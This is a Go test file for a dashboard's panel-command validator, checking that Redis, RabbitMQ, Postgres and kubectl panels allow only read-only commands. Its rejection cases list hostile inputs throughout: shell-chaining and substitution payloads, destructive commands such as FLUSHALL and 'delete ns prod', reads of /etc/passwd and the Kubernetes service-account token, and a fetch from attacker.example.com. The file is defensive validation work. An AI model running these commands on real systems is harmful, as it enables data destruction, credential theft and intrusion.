package dashboard

import (
	"strings"
	"testing"
)

func TestValidatePanelCommand_AllowsReadOnlyCommands(t *testing.T) {
	cases := []struct {
		datasource string
		command    string
	}{
		{DatasourceRedis, "INFO"},
		{DatasourceRedis, "INFO memory"},
		{DatasourceRedis, "info replication"}, // case-insensitive
		{DatasourceRedis, "DBSIZE"},
		{DatasourceRedis, "CONFIG GET maxmemory"},
		{DatasourceRedis, "CLIENT LIST"},
		{DatasourceRedis, "SLOWLOG GET 10"},
		{DatasourceRabbitMQ, "list queues"},
		{DatasourceRabbitMQ, "list queues name messages consumers"},
		{DatasourceRabbitMQ, "show overview"},
	}
	for _, tc := range cases {
		if err := ValidatePanelCommand(tc.datasource, tc.command); err != nil {
			t.Errorf("%s %q: expected allowed, got %v", tc.datasource, tc.command, err)
		}
	}
}

func TestValidatePanelCommand_RejectsWrites(t *testing.T) {
	// The point of the allowlist: a dashboard is authored by one user and run by
	// every viewer, so a panel must never be able to mutate or drain anything.
	cases := []struct {
		datasource string
		command    string
	}{
		{DatasourceRedis, "FLUSHALL"},
		{DatasourceRedis, "DEL mykey"},
		{DatasourceRedis, "SET k v"},
		{DatasourceRedis, "KEYS *"}, // read, but O(n) blocking — not on the list
		{DatasourceRedis, "CONFIG SET maxmemory 0"},
		{DatasourceRedis, "CLIENT KILL ID 4"},
		{DatasourceRedis, "SHUTDOWN"},
		{DatasourceRabbitMQ, "delete queue name=work"},
		{DatasourceRabbitMQ, "purge queue name=work"},
		{DatasourceRabbitMQ, "publish routing_key=q payload=hi"},
		{DatasourceRabbitMQ, "close connection name=c"},
		// rabbitmqadmin is case-sensitive, so an upper-case verb is not the same
		// command and must not be waved through by a case-insensitive match.
		{DatasourceRabbitMQ, "LIST queues"},
	}
	for _, tc := range cases {
		if err := ValidatePanelCommand(tc.datasource, tc.command); err == nil {
			t.Errorf("%s %q: expected rejection, got nil", tc.datasource, tc.command)
		}
	}
}

func TestValidatePanelCommand_PostgresAllowsReads(t *testing.T) {
	for _, sql := range []string{
		"SELECT 1",
		"select count(*) from pg_stat_activity",
		// Single quotes are ordinary SQL and must survive — they are inside
		// psql's double-quoted -c argument, so they cannot escape it.
		"SELECT state, count(*) FROM pg_stat_activity WHERE state = 'active' GROUP BY state",
		"WITH recent AS (SELECT * FROM pg_stat_activity) SELECT count(*) FROM recent",
		"SHOW max_connections",
		"EXPLAIN SELECT 1",
		"TABLE pg_stat_database",
	} {
		if err := ValidatePanelCommand(DatasourcePostgres, sql); err != nil {
			t.Errorf("%q: expected allowed, got %v", sql, err)
		}
	}
}

func TestValidatePanelCommand_PostgresRejectsWrites(t *testing.T) {
	cases := []struct {
		sql    string
		reason string
	}{
		{"DELETE FROM users", "bare write"},
		{"UPDATE users SET name = 'x'", "bare write"},
		{"INSERT INTO users VALUES (1)", "bare write"},
		{"DROP TABLE users", "bare write"},
		{"TRUNCATE users", "bare write"},
		{"CREATE TABLE t (id int)", "bare write"},
		{"GRANT ALL ON users TO public", "privilege change"},
		{"VACUUM FULL", "maintenance"},
		// Postgres allows data-modifying CTEs, so a statement that OPENS with an
		// allowed keyword can still write. This is why write verbs are rejected
		// anywhere, not only at the start.
		{"WITH gone AS (DELETE FROM users RETURNING *) SELECT * FROM gone", "data-modifying CTE"},
		// EXPLAIN ANALYZE executes the statement rather than only planning it.
		{"EXPLAIN ANALYZE SELECT 1", "executes"},
		// SELECT … INTO creates a table and fills it, and opens with an ALLOWED
		// prefix — the same shape of bypass as the data-modifying CTE above.
		{"SELECT * INTO stolen FROM users", "SELECT INTO creates a table"},
		{"SELECT id INTO TEMP t FROM users", "SELECT INTO, temp table"},
		// Two statements in one -c: psql runs both.
		{"SELECT 1; DROP TABLE users", "statement chaining"},
		{"COPY users TO '/tmp/x'", "writes a file"},
		{"SET search_path = evil", "session state"},
	}
	for _, tc := range cases {
		if err := ValidatePanelCommand(DatasourcePostgres, tc.sql); err == nil {
			t.Errorf("%q (%s): expected rejection, got nil", tc.sql, tc.reason)
		}
	}
}

func TestValidatePanelCommand_PostgresRejectsShellEscapes(t *testing.T) {
	// The statement is embedded in psql's -c "…", so anything that could close
	// that string or expand inside it has to go.
	for _, sql := range []string{
		`SELECT "quoted_column" FROM t`,
		"SELECT 1 `whoami`",
		"SELECT $PGPASSWORD",
		"SELECT $$dollar quoted$$",
		"SELECT 1 > /tmp/out",
		"SELECT 1\\",
		"SELECT 1\nSELECT 2",
	} {
		if err := ValidatePanelCommand(DatasourcePostgres, sql); err == nil {
			t.Errorf("%q: expected rejection, got nil", sql)
		}
	}
}

func TestValidatePanelCommand_PostgresRequiresAReadingStatement(t *testing.T) {
	if err := ValidatePanelCommand(DatasourcePostgres, "pg_dump"); err == nil {
		t.Error("expected a non-SELECT statement to be rejected")
	}
	if err := ValidatePanelCommand(DatasourcePostgres, "   "); err == nil {
		t.Error("expected an empty statement to be rejected")
	}
}

func TestBuildShellCommand(t *testing.T) {
	// psql takes the statement as ONE argument, so it is quoted; the other two
	// take ordinary words and must not be.
	got := buildShellCommand(DatasourcePostgres, "SELECT 1")
	if got != `psql -A -F '|' -c "SELECT 1"` {
		t.Errorf("postgres command = %q", got)
	}
	if got := buildShellCommand(DatasourceRedis, "INFO memory"); !strings.HasSuffix(got, " INFO memory") {
		t.Errorf("redis command = %q", got)
	}
	if got := buildShellCommand(DatasourceRabbitMQ, "list queues"); !strings.HasSuffix(got, " list queues") {
		t.Errorf("rabbitmq command = %q", got)
	}
}

func TestParsePsqlOutput(t *testing.T) {
	got := parsePsqlOutput("state|count\nactive|3\nidle|11\n(2 rows)\n")
	if len(got.Columns) != 2 || got.Columns[0] != "state" || got.Columns[1] != "count" {
		t.Fatalf("columns = %v", got.Columns)
	}
	// The footer is psql's, not a row.
	if len(got.Rows) != 2 || got.Rows[1][0] != "idle" || got.Rows[1][1] != "11" {
		t.Fatalf("rows = %v", got.Rows)
	}

	// A short row must not index out of range.
	short := parsePsqlOutput("a|b|c\n1|2\n(1 row)")
	if len(short.Rows[0]) != 3 || short.Rows[0][2] != "" {
		t.Errorf("short row = %v", short.Rows[0])
	}

	// A psql error has no header row; showing it verbatim beats splitting it
	// into nonsense columns.
	failed := parsePsqlOutput(`ERROR:  relation "nope" does not exist`)
	if failed.Columns[0] != "Output" || !strings.HasPrefix(failed.Rows[0][0], "ERROR:") {
		t.Errorf("error output = %+v", failed)
	}

	if empty := parsePsqlOutput(""); len(empty.Rows) != 0 {
		t.Errorf("empty output = %+v", empty)
	}
}

func TestValidateDefinition_PostgresPanel(t *testing.T) {
	def := Definition{Panels: []Panel{{
		Id:         1,
		Title:      "connections by state",
		Type:       VizTable,
		Datasource: DatasourcePostgres,
		AccountIds: []string{"acc-1"},
		GridPos:    GridPos{W: 6, H: 8},
		Targets:    []PanelTarget{{RefId: "A", Expr: "SELECT state, count(*) FROM pg_stat_activity GROUP BY state"}},
	}}}
	if err := ValidateDefinition(def); err != nil {
		t.Fatalf("expected a valid postgres panel, got %v", err)
	}

	def.Panels[0].Targets[0].Expr = "DELETE FROM users"
	if err := ValidateDefinition(def); err == nil {
		t.Error("expected a write statement to be rejected at save")
	}
}

func TestValidatePanelCommand_RejectsShellEscapes(t *testing.T) {
	// The panel supplies only the arguments after a credentialed prefix this
	// package builds. Anything that could terminate that command and start
	// another has to be refused.
	for _, command := range []string{
		"INFO; FLUSHALL",
		"INFO && redis-cli FLUSHALL",
		"INFO | tee /tmp/x",
		"INFO `whoami`",
		"INFO $(whoami)",
		"INFO $REDIS_PASSWORD",
		"INFO > /tmp/out",
		"INFO\nFLUSHALL",
		`INFO "quoted"`,
		"INFO 'quoted'",
		"INFO \\; FLUSHALL",
	} {
		if err := ValidatePanelCommand(DatasourceRedis, command); err == nil {
			t.Errorf("%q: expected rejection, got nil", command)
		}
	}
}

func TestValidatePanelCommand_RejectsEmptyOversizedAndUnknownDatasource(t *testing.T) {
	if err := ValidatePanelCommand(DatasourceRedis, "   "); err == nil {
		t.Error("expected empty command to be rejected")
	}
	if err := ValidatePanelCommand(DatasourceRedis, "INFO "+strings.Repeat("a", maxCommandLength)); err == nil {
		t.Error("expected oversized command to be rejected")
	}
	// metrics panels do not run commands; asking to run one is a coding error,
	// not a fallthrough to "allowed".
	if err := ValidatePanelCommand(DatasourceMetrics, "INFO"); err == nil {
		t.Error("expected a non-command datasource to be rejected")
	}
}

func TestValidateDefinition_CommandPanels(t *testing.T) {
	build := func(mutate func(*Panel)) Definition {
		p := Panel{
			Id:         1,
			Title:      "redis memory",
			Type:       VizTable,
			Datasource: DatasourceRedis,
			AccountIds: []string{"acc-1"},
			GridPos:    GridPos{W: 6, H: 8},
			Targets:    []PanelTarget{{RefId: "A", Expr: "INFO memory"}},
		}
		mutate(&p)
		return Definition{Panels: []Panel{p}}
	}

	if err := ValidateDefinition(build(func(*Panel) {})); err != nil {
		t.Fatalf("expected a valid redis table panel, got %v", err)
	}

	// A snapshot of text has nothing to plot, so the chart types are refused at
	// save rather than rendering an empty chart.
	for _, viz := range []string{VizTimeseries, VizStat, VizGauge, VizBar} {
		if err := ValidateDefinition(build(func(p *Panel) { p.Type = viz })); err == nil {
			t.Errorf("expected %s to be rejected for a command datasource", viz)
		}
	}

	// Save-time validation must run the same allowlist the executor does,
	// otherwise the rejection only surfaces on someone else's screen at render.
	if err := ValidateDefinition(build(func(p *Panel) { p.Targets[0].Expr = "FLUSHALL" })); err == nil {
		t.Error("expected a write command to be rejected at save")
	}
}

func TestParseRedisOutput(t *testing.T) {
	info := "# Memory\r\nused_memory:1024\r\nused_memory_human:1.00K\r\n\r\n# Stats\r\ntotal_connections_received:7\r\n"
	got := parseRedisOutput(info)
	if want := []string{"Key", "Value"}; got.Columns[0] != want[0] || got.Columns[1] != want[1] {
		t.Fatalf("columns = %v", got.Columns)
	}
	// Section headers and blank lines carry no data.
	if len(got.Rows) != 3 {
		t.Fatalf("rows = %v", got.Rows)
	}
	if got.Rows[0][0] != "used_memory" || got.Rows[0][1] != "1024" {
		t.Errorf("first row = %v", got.Rows[0])
	}

	// Line-oriented output (PING, DBSIZE) has no key:value shape to split on.
	plain := parseRedisOutput("PONG")
	if len(plain.Columns) != 1 || plain.Columns[0] != "Output" || plain.Rows[0][0] != "PONG" {
		t.Errorf("plain output = %+v", plain)
	}
}

func TestParseRabbitmqOutput(t *testing.T) {
	table := `+---------+----------+
|  name   | messages |
+---------+----------+
| work    | 12       |
| retries | 0        |
+---------+----------+`
	got := parseRabbitmqOutput(table)
	if len(got.Columns) != 2 || got.Columns[0] != "name" || got.Columns[1] != "messages" {
		t.Fatalf("columns = %v", got.Columns)
	}
	if len(got.Rows) != 2 || got.Rows[0][0] != "work" || got.Rows[0][1] != "12" {
		t.Fatalf("rows = %v", got.Rows)
	}

	// An error or a non-table response must still reach the user verbatim
	// rather than rendering as an empty table.
	fallback := parseRabbitmqOutput("Error: not authorized")
	if fallback.Columns[0] != "Output" || fallback.Rows[0][0] != "Error: not authorized" {
		t.Errorf("fallback = %+v", fallback)
	}
}

func TestCapRows(t *testing.T) {
	rows := make([][]string, maxQueryRows+10)
	for i := range rows {
		rows[i] = []string{"x"}
	}
	got := capRows(&QueryResult{Columns: []string{"Output"}, Rows: rows})
	if len(got.Rows) != maxQueryRows || !got.Truncated {
		t.Errorf("rows = %d truncated = %v", len(got.Rows), got.Truncated)
	}
	// Under the cap nothing is flagged — a panel must not claim truncation it
	// did not perform.
	small := capRows(&QueryResult{Columns: []string{"Output"}, Rows: [][]string{{"x"}}})
	if small.Truncated {
		t.Error("expected truncated = false")
	}
}

func TestValidatePanelCommand_KubectlAllowsReads(t *testing.T) {
	cases := []string{
		"get pods",
		"get pods -n kube-system -o wide",
		"get deploy/api -n prod -o name",
		"Get pods", // folded down, since kubectl itself only takes lowercase
		"get pods -l app=web --sort-by .status.startTime",
		"describe deployment api -n prod",
		"logs deploy/api -n prod --tail 100",
		"top pod -n kube-system",
		"top node",
		"explain pod.spec",
		"api-resources",
		"api-versions",
		"version",
		"cluster-info",
		// A namespace that happens to be called `secrets` is a namespace, not the
		// resource — the value of `-n` is never read as one.
		"get pods -n secrets",
		// Every spelling of the same flag, since the allow-list reads them all.
		"get pods -A",
		"get pods -o json",
		"get pods -o=json",
		"get pods -ojson",
		"get pods --output=yaml",
		"get pods -o custom-columns=NAME:.metadata.name",
		"get pods --no-headers --show-labels",
		"logs deploy/api -c api --since 1h --timestamps",
	}
	for _, cmd := range cases {
		if err := ValidatePanelCommand(DatasourceKubectl, cmd); err != nil {
			t.Errorf("kubectl %q: expected allowed, got %v", cmd, err)
		}
	}
}

func TestValidatePanelCommand_KubectlRejectsWrites(t *testing.T) {
	// The agent's own guard cannot be leaned on: kubectl_command_executor
	// defaults allow_crud to true, matches on a prefix, and runs the string
	// through a shell. Every one of these has to die here.
	cases := []string{
		"delete pod api -n prod",
		"apply -f /tmp/x.yaml",
		"patch deploy api -p {}",
		"edit deploy api",
		"replace -f /tmp/x.yaml",
		"create ns x",
		"scale deploy api --replicas 0",
		"rollout restart deploy/api",
		"drain node-1",
		"cordon node-1",
		"uncordon node-1",
		"taint node node-1 key=value:NoSchedule",
		"annotate pod api key=value",
		"label pod api key=value",
		"set image deploy/api api=nginx",
		"run x --image nginx",
		// Not writes, but not a panel either: a session, a tunnel, a file copy.
		// `exec` is on the AGENT's allowlist, which is exactly why it is here.
		"exec -it api -- sh",
		"attach api",
		"debug node/node-1 -it",
		"port-forward svc/api 8080:80",
		"proxy --port 8080",
		"cp api:/etc/passwd /tmp/passwd",
		"auth can-i --list",
	}
	for _, cmd := range cases {
		if err := ValidatePanelCommand(DatasourceKubectl, cmd); err == nil {
			t.Errorf("kubectl %q: expected rejection, got nil", cmd)
		}
	}
}

func TestValidatePanelCommand_KubectlRejectsShellEscapes(t *testing.T) {
	// A read verb followed by anything the shell would treat as a second
	// command. The agent runs the string with shell=True, so these are the
	// escapes that matter most.
	cases := []string{
		"get pods; kubectl delete ns prod",
		"get pods && kubectl delete ns prod",
		"get pods | sh",
		"get pods > /tmp/out",
		"get pods `kubectl delete ns prod`",
		"get pods $(kubectl delete ns prod)",
		"get pods -o jsonpath='{.items[*].metadata.name}'",
		"get pods\nkubectl delete ns prod",
	}
	for _, cmd := range cases {
		if err := ValidatePanelCommand(DatasourceKubectl, cmd); err == nil {
			t.Errorf("kubectl %q: expected rejection, got nil", cmd)
		}
	}
}

func TestValidatePanelCommand_KubectlRejectsFlagsOutsideTheAllowlist(t *testing.T) {
	// The flag list is an allow-list precisely because this set kept growing: a
	// deny-list blocked `-f` as streaming and left `--filename` open as file
	// access, and blocked nothing at all in the `-o …-file=<path>` family.
	cases := []string{
		"get --raw /api/v1/namespaces/default/secrets",
		"get pods --server=https://elsewhere",
		"get pods -s https://elsewhere",
		"get pods --kubeconfig /tmp/other.yaml",
		"get pods --context other",
		"get pods --token abc123",
		"get pods --as system:admin",
		"get pods --as-group system:masters",
		"get pods --insecure-skip-tls-verify",
		// Streaming never returns, and the relay call behind a panel has a
		// timeout rather than a stream.
		"logs -f deploy/api",
		"logs --follow deploy/api",
		"get pods -w",
		"get pods --watch",
		// Local file access and SSRF. `kubectl get -f` takes a path OR a URL,
		// which it fetches from inside the customer's cluster.
		"get pods --filename /etc/passwd",
		"get pods --filename=/etc/passwd",
		"get pods --filename=https://attacker.example.com/x.yaml",
		"get pods -k /tmp",
		"get pods -k=/tmp",
		"get pods --kustomize /tmp",
		"get pods --kustomize=/tmp",
		// A Go template with no actions renders itself, so a template FILE is an
		// arbitrary read — including the agent's own service-account token.
		"get pods -o go-template-file=/etc/passwd",
		"get pods -o=jsonpath-file=/etc/passwd",
		"get pods -ogo-template-file=/etc/passwd",
		"get pods -o custom-columns-file=/etc/passwd",
		"get pods --output=go-template-file=/var/run/secrets/kubernetes.io/serviceaccount/token",
		// `--template` takes a path too, so it is no safer than the format above.
		"get pods -o go-template --template=/etc/passwd",
		// Writes a file into the agent container — a write from a read-only panel.
		"get pods --profile-output=/tmp/x",
		// Short flags are case-sensitive to kubectl, so folding case here would
		// accept a flag kubectl itself would reject.
		"get pods -a",
	}
	for _, cmd := range cases {
		if err := ValidatePanelCommand(DatasourceKubectl, cmd); err == nil {
			t.Errorf("kubectl %q: expected rejection, got nil", cmd)
		}
	}
}

func TestValidatePanelCommand_KubectlRejectsSecrets(t *testing.T) {
	// base64 is not encryption, and a rendered panel has a far wider audience
	// than a shell — so every spelling of the resource is refused.
	cases := []string{
		"get secrets",
		"get secret -o yaml",
		"get secrets -A -o json",
		"get secret/db -n prod",
		"get secrets.v1. -n prod",
		"get Secret db -n prod",
		"describe secret db -n prod",
		// One argument naming two resources: the denied one must not ride along
		// with an allowed one.
		"get po,secrets -n prod",
		"get secrets,po -n prod",
	}
	for _, cmd := range cases {
		if err := ValidatePanelCommand(DatasourceKubectl, cmd); err == nil {
			t.Errorf("kubectl %q: expected rejection, got nil", cmd)
		}
	}
}

func TestBuildShellCommand_Kubectl(t *testing.T) {
	// The binary is ours, the rest is the panel's — the panel can never name
	// another one.
	if got := buildShellCommand(DatasourceKubectl, "get pods -n prod"); got != "kubectl get pods -n prod" {
		t.Errorf("kubectl command = %q", got)
	}
}

func TestParseKubectlOutput(t *testing.T) {
	// `get` prints aligned columns. A single space is INSIDE a cell (`3/3
	// Running`), so only runs of two or more separate them.
	table := "NAME      READY   STATUS    RESTARTS   AGE\napi-0     3/3     Running   0          5d\nweb-1     1/1     Running   2          12h\n"
	result := parseKubectlOutput("get pods", table, "")
	if len(result.Columns) != 5 || result.Columns[0] != "NAME" || result.Columns[3] != "RESTARTS" {
		t.Fatalf("columns = %v", result.Columns)
	}
	if len(result.Rows) != 2 {
		t.Fatalf("rows = %v", result.Rows)
	}
	if result.Rows[0][1] != "3/3" || result.Rows[0][2] != "Running" {
		t.Errorf("row = %v", result.Rows[0])
	}

	// describe is prose: splitting it would invent columns that are not there.
	described := parseKubectlOutput("describe pod api-0", "Name:         api-0\nNamespace:    prod\n", "")
	if len(described.Columns) != 1 || described.Columns[0] != "Output" {
		t.Errorf("describe columns = %v", described.Columns)
	}
	if len(described.Rows) != 2 {
		t.Errorf("describe rows = %v", described.Rows)
	}

	// An explicit output format prints one document, however tabular the verb.
	jsonOut := parseKubectlOutput("get pods -o json", "{\n  \"items\": []\n}\n", "")
	if len(jsonOut.Columns) != 1 || jsonOut.Columns[0] != "Output" {
		t.Errorf("json columns = %v", jsonOut.Columns)
	}
	// Same for the spelling with no separator, which used to reach the table
	// parser as if it were `-o wide` and render JSON as garbled columns.
	joined := parseKubectlOutput("get pods -ojson", "{\n  \"items\": []\n}\n", "")
	if len(joined.Columns) != 1 || joined.Columns[0] != "Output" {
		t.Errorf("-ojson columns = %v", joined.Columns)
	}
	// `-o wide` is still a table, and so is custom-columns.
	wide := parseKubectlOutput("get pods -o wide", table, "")
	if len(wide.Columns) != 5 {
		t.Errorf("wide columns = %v", wide.Columns)
	}
	if cols := parseKubectlOutput("get pods -o custom-columns=NAME:.metadata.name", table, ""); len(cols.Columns) != 5 {
		t.Errorf("custom-columns columns = %v", cols.Columns)
	}

	// stderr is the answer only when there is no answer on stdout — kubectl
	// writes deprecation warnings there on commands that succeeded.
	failed := parseKubectlOutput("get pods", "", "Error from server (NotFound): namespaces \"nope\" not found\n")
	if len(failed.Rows) != 1 || !strings.Contains(failed.Rows[0][0], "NotFound") {
		t.Errorf("stderr rows = %v", failed.Rows)
	}
	warned := parseKubectlOutput("get pods", table, "Warning: v1 Pod is deprecated\n")
	if len(warned.Rows) != 2 {
		t.Errorf("expected the warning to be dropped in favour of stdout, got %v", warned.Rows)
	}

	empty := parseKubectlOutput("get pods", "", "")
	if len(empty.Rows) != 0 || len(empty.Columns) != 1 {
		t.Errorf("empty = %v / %v", empty.Columns, empty.Rows)
	}
}

func TestUnwrapKubectlOutput(t *testing.T) {
	// The agent publishes a JsonBlock, which arrives as a JSON string under `data`.
	stdout, stderr := unwrapKubectlOutput(map[string]any{"data": `{"command":"kubectl get pods","stdout":"NAME\napi-0\n","stderr":""}`})
	if !strings.Contains(stdout, "api-0") || stderr != "" {
		t.Errorf("stdout = %q stderr = %q", stdout, stderr)
	}
	// Its own refusal is a message worth showing rather than an empty panel.
	_, stderr = unwrapKubectlOutput(map[string]any{"data": `{"error":"only kubectl get commands are allowed"}`})
	if !strings.Contains(stderr, "only kubectl get commands are allowed") {
		t.Errorf("stderr = %q", stderr)
	}
	// Anything that is not the expected envelope leaves both empty rather than
	// panicking — the panel then says the command returned nothing.
	if out, _ := unwrapKubectlOutput(map[string]any{"data": "not json"}); out != "" {
		t.Errorf("stdout = %q", out)
	}
}

func TestValidateDefinition_KubectlPanelIsKubernetesOnly(t *testing.T) {
	build := func(mutate func(*Panel)) Definition {
		p := Panel{
			Id:          1,
			Title:       "pods",
			Type:        VizTable,
			Datasource:  DatasourceKubectl,
			AccountType: KubernetesAccountProvider,
			GridPos:     GridPos{W: 6, H: 8},
			Targets:     []PanelTarget{{RefId: "A", Expr: "get pods -n prod"}},
		}
		mutate(&p)
		return Definition{Panels: []Panel{p}}
	}

	if err := ValidateDefinition(build(func(*Panel) {})); err != nil {
		t.Fatalf("expected a valid kubectl panel, got %v", err)
	}
	// The column reads `K8s` and the UI renders `K8S`; neither spelling may fail.
	if err := ValidateDefinition(build(func(p *Panel) { p.AccountType = "K8S" })); err != nil {
		t.Errorf("expected K8S to be accepted, got %v", err)
	}
	for _, provider := range []string{"AWS", "GCP", "AZURE", "SelfHosted"} {
		if err := ValidateDefinition(build(func(p *Panel) { p.AccountType = provider })); err == nil {
			t.Errorf("expected a %s-scoped kubectl panel to be rejected", provider)
		}
	}
	// An id-scoped panel names no provider, so it passes here and is checked at
	// execute, where the account record is in reach.
	if err := ValidateDefinition(build(func(p *Panel) { p.AccountType = ""; p.AccountIds = []string{"acc-1"} })); err != nil {
		t.Errorf("expected an id-scoped kubectl panel to save, got %v", err)
	}
	if err := ValidateDefinition(build(func(p *Panel) { p.Targets[0].Expr = "delete ns prod" })); err == nil {
		t.Error("expected a write command to be rejected at save")
	}
}
